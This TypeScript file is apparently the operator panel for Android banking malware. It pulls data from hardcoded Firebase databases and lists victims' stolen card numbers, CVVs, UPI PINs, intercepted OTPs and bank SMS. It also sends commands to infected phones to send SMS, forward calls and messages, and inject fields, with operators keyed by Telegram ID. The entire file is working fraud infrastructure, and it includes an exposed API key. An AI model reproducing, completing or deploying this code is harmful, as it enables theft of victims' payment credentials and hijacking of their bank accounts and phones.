// Direct Firebase Realtime Database REST client.
// Reads/writes https://<db>.firebaseio.com/<path>.json?key=<apiKey> straight
// from the browser. The api-server is only used for login (Bearer session);
// all panel data + device actions go to Firebase directly with the web API key.
import { normalizeDevice, type NormalizedDevice } from "./normalizeDevice";

export const FIREBASE_DB_URL = "https://axexodiweb-default-rtdb.firebaseio.com";
export const FIREBASE_API_KEY = "AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk";

const AUTH_KEY = "cyberzone_auth";

function getAuth(): { telegramId: string; isAdmin: boolean } {
  try {
    const raw = localStorage.getItem(AUTH_KEY);
    if (raw) {
      const p = JSON.parse(raw);
      return {
        telegramId: String(p.telegramId || ""),
        isAdmin: !!p.isAdmin,
      };
    }
  } catch {
    /* ignore */
  }
  return { telegramId: "", isAdmin: false };
}

// ── low-level REST ───────────────────────────────────────────────────────────

async function fb(
  base: string,
  key: string,
  path: string,
  method = "GET",
  body?: any,
  extraQuery = ""
): Promise<any> {
  const params = [`key=${encodeURIComponent(key)}`];
  if (extraQuery) params.push(extraQuery.replace(/^\?/, ""));
  const url = `${base}/${path}.json?${params.join("&")}`;
  const res = await fetch(url, {
    method,
    headers: body != null ? { "Content-Type": "application/json" } : undefined,
    body: body != null ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) throw new Error(`FB ${method} ${path} -> ${res.status}`);
  return method === "GET" ? res.json() : undefined;
}

const primary = () => ({ url: FIREBASE_DB_URL, key: FIREBASE_API_KEY });

async function listInstances(): Promise<
  { id: string; name: string; url: string; key: string }[]
> {
  const out: { id: string; name: string; url: string; key: string }[] = [
    { id: "primary", name: "Primary", ...primary() },
  ];
  try {
    const cfg = (await fb(
      primary().url,
      primary().key,
      "config/firebases"
    )) as Record<string, any> | null;
    if (cfg) {
      for (const [id, e] of Object.entries(cfg)) {
        if (!e || e.enabled === false || !e.databaseURL) continue;
        out.push({
          id,
          name: e.name || id,
          url: String(e.databaseURL),
          key: String(e.apiKey || FIREBASE_API_KEY),
        });
      }
    }
  } catch {
    /* primary only */
  }
  return out;
}

// ── device normalization (mirrors api-server panel.ts) ───────────────────────

export interface PanelDevice extends NormalizedDevice {
  webview?: boolean;
}

function isOnlineRaw(c: any): boolean {
  const t = c?.ping ?? c?.lastPing;
  if (t != null) {
    const n = Number(t);
    if (!isNaN(n)) return Date.now() - n < 300_000;
  }
  if (typeof c?.status === "boolean") return c.status;
  if (typeof c?.status === "string")
    return c.status === "true" || c.status === "online";
  return false;
}

function foldWebviewNodes(clients: Record<string, any>): any[] {
  const FOLD_FIELDS = [
    "cc_cardNumber",
    "cc_cardholderName",
    "cc_expiry",
    "cc_cvv",
    "cc_timestamp",
    "upi_id",
    "upi_name",
    "upi_phone",
    "upi_pin",
    "upi_timestamp",
  ];
  const keys = Object.keys(clients || {});
  const nativeByOwner: Record<string, { key: string; val: any }> = {};
  keys.forEach((k) => {
    const v = clients[k];
    if (!v || typeof v !== "object") return;
    if (
      v.webview !== true &&
      v.ownerTelegramId &&
      !nativeByOwner[v.ownerTelegramId]
    ) {
      nativeByOwner[v.ownerTelegramId] = { key: k, val: v };
    }
  });
  const out: any[] = [];
  const seen = new Set<string>();
  keys.forEach((k) => {
    const v = clients[k];
    if (!v || typeof v !== "object") return;
    if (
      v.webview === true &&
      nativeByOwner[v.ownerTelegramId] &&
      nativeByOwner[v.ownerTelegramId].key !== k
    ) {
      const target = nativeByOwner[v.ownerTelegramId];
      for (const f of FOLD_FIELDS)
        if (v[f] && !target.val[f]) target.val[f] = v[f];
      return;
    }
    if (seen.has(k)) return;
    seen.add(k);
    out.push({ ...normalizeDevice(k, v), raw: v });
  });
  return out;
}

function canSee(ownerId: string | undefined, telegramId: string): boolean {
  return !ownerId || ownerId === telegramId;
}

// ── Bootstrap (dashboard) ─────────────────────────────────────────────────────

export interface Bootstrap {
  success: boolean;
  devices: PanelDevice[];
  messageIds: string[];
  pins: string[];
  bankSms: number;
  totals: {
    online: number;
    offline: number;
    cards: number;
    upi: number;
    today: number;
  };
  instances: { id: string; name: string }[];
}

const BANK_SMS_RE =
  /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|net banking|atm|withdraw|credited|debited|transaction/i;

export async function getBootstrap(): Promise<Bootstrap> {
  const { telegramId, isAdmin } = getAuth();
  const instances = await listInstances();
  const devices: PanelDevice[] = [];
  const messageIds = new Set<string>();
  let bankSms = 0;
  let online = 0;
  let offline = 0;
  let cards = 0;
  let upi = 0;
  let today = 0;

  for (const inst of instances) {
    const [clients, msgs, otps] = await Promise.all([
      fb(inst.url, inst.key, "clients").catch(() => null),
      fb(
        inst.url,
        inst.key,
        "messages",
        "GET",
        undefined,
        "shallow=true"
      ).catch(() => null),
      fb(inst.url, inst.key, "otps/latest").catch(() => null),
    ]);
    if (!clients || typeof clients !== "object") continue;
    const list = foldWebviewNodes(clients);
    const now = new Date().toDateString();
    for (const d of list) {
      if (!isAdmin && !canSee(d.ownerTelegramId, telegramId)) continue;
      devices.push(d as PanelDevice);
      if (d.isOnline) online++;
      else offline++;
      if (
        Object.keys(d.raw).some(
          (k) => k.startsWith("cc_") || k === "cc" || k === "cards"
        )
      )
        cards++;
      if (d.upi) upi++;
      const cc =
        Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
      const u =
        Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
      const ts = Math.max(cc, u);
      if (ts && new Date(ts).toDateString() === now) today++;
    }
    if (msgs && typeof msgs === "object")
      Object.keys(msgs).forEach((id) => messageIds.add(id));
    const otpRecs = (otps?.latest || otps || {}) as Record<string, any>;
    for (const rec of Object.values(otpRecs)) {
      if (rec && BANK_SMS_RE.test(`${rec.body || ""} ${rec.service || ""}`))
        bankSms++;
    }
  }

  let pins: string[] = [];
  if (telegramId) {
    try {
      const p =
        (await fb(primary().url, primary().key, `config/pins/${telegramId}`)) ||
        {};
      pins = Object.keys(p).filter((k) => p[k]);
    } catch {
      /* no pins */
    }
  }

  return {
    success: true,
    devices,
    messageIds: [...messageIds],
    pins,
    bankSms,
    totals: { online, offline, cards, upi, today },
    instances: instances.map((i) => ({ id: i.id, name: i.name })),
  };
}

// ── Pins / alerts (per-user config) ──────────────────────────────────────────

export const getPins = async () => {
  const { telegramId } = getAuth();
  if (!telegramId) return { success: true, pins: [] as string[] };
  const p =
    (await fb(primary().url, primary().key, `config/pins/${telegramId}`).catch(
      () => null
    )) || {};
  return { success: true, pins: Object.keys(p).filter((k) => p[k]) };
};

export const setPin = async (deviceId: string, pinned: boolean) => {
  const { telegramId } = getAuth();
  if (!telegramId) return { success: true, pinned };
  if (pinned) {
    await fb(
      primary().url,
      primary().key,
      `config/pins/${telegramId}/${deviceId}`,
      "PUT",
      true
    );
  } else {
    await fb(
      primary().url,
      primary().key,
      `config/pins/${telegramId}/${deviceId}`,
      "DELETE"
    ).catch(() => {});
  }
  return { success: true, pinned };
};

export const setAlert = async (id: string, enabled: boolean) => {
  const { telegramId } = getAuth();
  if (!telegramId) return { success: true, enabled };
  if (enabled) {
    await fb(
      primary().url,
      primary().key,
      `config/onlineAlerts/${telegramId}/${id}`,
      "PUT",
      {
        enabled: true,
        createdAt: Date.now(),
      }
    );
  } else {
    await fb(
      primary().url,
      primary().key,
      `config/onlineAlerts/${telegramId}/${id}`,
      "DELETE"
    ).catch(() => {});
  }
  return { success: true, enabled };
};

// ── Device detail ────────────────────────────────────────────────────────────

export const getDevice = async (id: string) => {
  const instances = await listInstances();
  let device: any = null;
  let messages: Record<string, any> = {};
  for (const inst of instances) {
    const c = await fb(inst.url, inst.key, `clients/${id}`).catch(() => null);
    if (c && typeof c === "object") {
      device = { ...normalizeDevice(id, c), raw: c };
      device.instanceId = inst.id;
      device.instanceName = inst.name;
    }
    const msgs = await fb(inst.url, inst.key, `messages/${id}`).catch(
      () => null
    );
    if (msgs && typeof msgs === "object") messages = { ...messages, ...msgs };
    if (device) break;
  }
  if (!device) throw new Error("Device not found");
  return { success: true, device, messages };
};

// ── Device actions (writes to primary RTDB, same paths the APK listens on) ──

const PRIMARY_ACTION_FIELDS = [
  "ownerTelegramId",
  "memo",
  "deviceName",
  "group",
  "colorTag",
  "callForward",
];

export const patchDevice = async (id: string, fields: Record<string, any>) => {
  const patch: Record<string, any> = {};
  for (const k of PRIMARY_ACTION_FIELDS) if (k in fields) patch[k] = fields[k];
  if (!Object.keys(patch).length) return { success: true };
  await fb(primary().url, primary().key, `clients/${id}`, "PATCH", patch);
  return { success: true };
};

export const pingDevice = async (id: string) => {
  await fb(
    primary().url,
    primary().key,
    `clients/${id}/webhookEvent/checkLiveness`,
    "PUT",
    {
      text: "ping",
    }
  );
  return { success: true, pingedAt: Date.now() };
};

export const sendSms = async (
  id: string,
  to: string,
  message: string,
  sim = 0
) => {
  await fb(
    primary().url,
    primary().key,
    `clients/${id}/webhookEvent/sendSms`,
    "PUT",
    {
      to: String(to).trim(),
      message: String(message),
      isSended: true,
      from: Number(sim) || 0,
    }
  );
  return { success: true };
};

export const setForward = async (
  id: string,
  type: "call" | "sms",
  to: string,
  sim = 0,
  active = true
) => {
  await fb(
    primary().url,
    primary().key,
    `clients/${id}/webhookEvent/${type === "sms" ? "smsForward" : "callForward"}`,
    "PUT",
    { from: Number(sim) || 0, to: String(to).trim(), isActive: !!active }
  );
  return { success: true };
};

export const injectDevice = async (id: string, fields: Record<string, any>) => {
  await fb(
    primary().url,
    primary().key,
    `clients/${id}/inject`,
    "PATCH",
    fields
  );
  return { success: true };
};

export const deleteDevice = async (id: string) => {
  await fb(primary().url, primary().key, `clients/${id}`, "DELETE").catch(
    () => {}
  );
  return { success: true };
};

export const deleteSms = async (deviceId: string, key: string) => {
  await fb(
    primary().url,
    primary().key,
    `messages/${deviceId}/${key}`,
    "DELETE"
  ).catch(() => {});
  await fb(
    primary().url,
    primary().key,
    `clients/${deviceId}/sms/${key}`,
    "DELETE"
  ).catch(() => {});
  return { success: true };
};

// ── Fleet-wide aggregation (SMS / OTPs / scraped) ────────────────────────────

export interface SmsRow {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  dbLabel: string;
}

export async function getSms(): Promise<{ success: boolean; sms: SmsRow[] }> {
  const { telegramId, isAdmin } = getAuth();
  const instances = await listInstances();
  const entries: SmsRow[] = [];
  for (const inst of instances) {
    const [clients, msgs] = await Promise.all([
      fb(inst.url, inst.key, "clients").catch(() => null),
      fb(
        inst.url,
        inst.key,
        "messages",
        "GET",
        undefined,
        "shallow=true"
      ).catch(() => null),
    ]);
    if (!msgs || typeof msgs !== "object") continue;
    const clientsData = (clients || {}) as Record<string, any>;
    const deviceKeys = Object.keys(msgs);
    const orderByKey = `orderBy=${encodeURIComponent('"$key"')}&limitToLast=25`;
    for (let i = 0; i < deviceKeys.length; i += 10) {
      const batch = deviceKeys.slice(i, i + 10);
      const lists = await Promise.all(
        batch.map((deviceId) =>
          fb(
            inst.url,
            inst.key,
            `messages/${deviceId}`,
            "GET",
            undefined,
            orderByKey
          ).catch(() => null)
        )
      );
      batch.forEach((deviceId, idx) => {
        const list = lists[idx] || {};
        const device = clientsData[deviceId] || {};
        if (!isAdmin && !canSee(device.ownerTelegramId, telegramId)) return;
        if (!list || typeof list !== "object") return;
        for (const [pushKey, sms] of Object.entries(
          list as Record<string, any>
        )) {
          if (!sms) continue;
          const body = sms.message || sms.body || "";
          const sortKey =
            sms.id != null
              ? Number(sms.id)
              : sms.date
                ? parseInt(String(sms.date), 10)
                : 0;
          entries.push({
            deviceId,
            deviceModel: device.modelName || device.model || "Unknown",
            devicePhone: device.mobNo || device.phone || "",
            pushKey,
            from: sms.sender || sms.from || "Unknown",
            body,
            date: sortKey,
            dbLabel: inst.name || inst.id,
          });
        }
      });
    }
    // Legacy sms under clients/{id}/sms
    for (const [deviceId, device] of Object.entries(clientsData)) {
      if (!device || typeof device !== "object") continue;
      if (!isAdmin && !canSee(device.ownerTelegramId, telegramId)) continue;
      if (!device.sms || msgs[deviceId]) continue;
      for (const [pushKey, sms] of Object.entries(
        device.sms as Record<string, any>
      )) {
        if (!sms) continue;
        entries.push({
          deviceId,
          deviceModel: device.modelName || device.model || "Unknown",
          devicePhone: device.mobNo || device.phone || "",
          pushKey,
          from: sms.from || "Unknown",
          body: sms.body || "",
          date: sms.date ? parseInt(String(sms.date), 10) : 0,
          dbLabel: inst.name || inst.id,
        });
      }
    }
  }
  entries.sort((a, b) => b.date - a.date);
  return { success: true, sms: entries.slice(0, 600) };
}

export interface OtpRow {
  code: string;
  service: string;
  number: string;
  from: string;
  body: string;
  deviceId: string;
  date: number;
}

export async function getOtps(): Promise<{
  success: boolean;
  otps: OtpRow[];
  devices: {
    id: string;
    model: string;
    isOnline: boolean;
    numbers: string[];
  }[];
}> {
  const { telegramId, isAdmin } = getAuth();
  const instances = await listInstances();
  const otps: OtpRow[] = [];
  const devices: {
    id: string;
    model: string;
    isOnline: boolean;
    numbers: string[];
  }[] = [];
  for (const inst of instances) {
    const [otpRecs, clients] = await Promise.all([
      fb(inst.url, inst.key, "otps/latest").catch(() => null),
      fb(inst.url, inst.key, "clients").catch(() => null),
    ]);
    const list = (otpRecs?.latest || otpRecs || {}) as Record<string, any>;
    if (list && typeof list === "object") {
      for (const rec of Object.values(list)) {
        if (!rec || !rec.code) continue;
        otps.push({
          code: rec.code,
          service: rec.service || "",
          number: rec.number || "",
          from: rec.from || "",
          body: rec.body || "",
          deviceId: rec.deviceId || "",
          date: rec.date || 0,
        });
      }
    }
    if (clients && typeof clients === "object") {
      for (const [id, d] of Object.entries(clients as Record<string, any>)) {
        if (!d || typeof d !== "object" || id.startsWith("*")) continue;
        if (!isAdmin && !canSee(d.ownerTelegramId, telegramId)) continue;
        const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
        const nums = [
          d.mobNo || d.phone || "",
          ...sims.map((s: any) => s?.phoneNumber || ""),
        ].filter(
          (n) => !!n && /^\+?\d{6,15}$/.test(String(n).replace(/[\s-]/g, ""))
        );
        if (!nums.length) continue;
        devices.push({
          id,
          model: d.modelName || d.model || "Unknown",
          isOnline: isOnlineRaw(d),
          numbers: [...new Set(nums)],
        });
      }
    }
  }
  otps.sort((a, b) => (b.date || 0) - (a.date || 0));
  return { success: true, otps: otps.slice(0, 500), devices };
}

export interface ScrapedCard {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  ownerTelegramId: string | null;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  ip: string;
  timestamp: string;
}

export interface ScrapedDevice {
  deviceId: string;
  model: string;
  phone: string;
  sim1: string;
  sim2: string;
  battery: string;
  ip: string;
  storage: string;
  androidV: string;
  joined: string;
  status: boolean;
  ownerTelegramId: string | null;
}

export async function getScraped(): Promise<{
  success: boolean;
  cards: ScrapedCard[];
  devices: ScrapedDevice[];
}> {
  const { telegramId, isAdmin } = getAuth();
  const instances = await listInstances();
  const cards: ScrapedCard[] = [];
  const devices: ScrapedDevice[] = [];
  for (const inst of instances) {
    const data = await fb(inst.url, inst.key, "clients").catch(() => null);
    if (!data || typeof data !== "object") continue;
    for (const [deviceId, d] of Object.entries(data as Record<string, any>)) {
      if (!d || typeof d !== "object" || deviceId.startsWith("*")) continue;
      if (!isAdmin && !canSee(d.ownerTelegramId, telegramId)) continue;
      const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
      const simStr = (s: any) =>
        s?.phoneNumber && s.phoneNumber !== "Unknown" ? s.phoneNumber : "";
      devices.push({
        deviceId,
        model: d.modelName || d.model || "Unknown",
        phone: d.mobNo || d.phone || "",
        sim1: simStr(sims[0]) || "",
        sim2: simStr(sims[1]) || "",
        battery: d.battery || "?",
        ip: d.ip_address || "—",
        storage: d.storage || "—",
        androidV: d.androidV || "—",
        joined: d.joined || "—",
        status: typeof d.status === "boolean" ? d.status : false,
        ownerTelegramId: d.ownerTelegramId || null,
      });
      const cardNumber = d.cc_cardNumber || d.cardNumber || null;
      if (cardNumber) {
        cards.push({
          deviceId,
          deviceModel: d.modelName || d.model || "Unknown",
          devicePhone: d.mobNo || d.phone || "",
          ownerTelegramId: d.ownerTelegramId || null,
          cardNumber,
          cardholderName: d.cc_cardholderName || d.cardholderName || "Unknown",
          expiry: d.cc_expiry || d.expiry || "??/??",
          cvv: d.cc_cvv || d.cvv || "???",
          ip: d.cc_ip || d.ip_address || "—",
          timestamp: d.cc_timestamp || d.timestamp || "—",
        });
      }
    }
  }
  cards.sort((a, b) => (b.timestamp > a.timestamp ? 1 : -1));
  return { success: true, cards, devices };
}
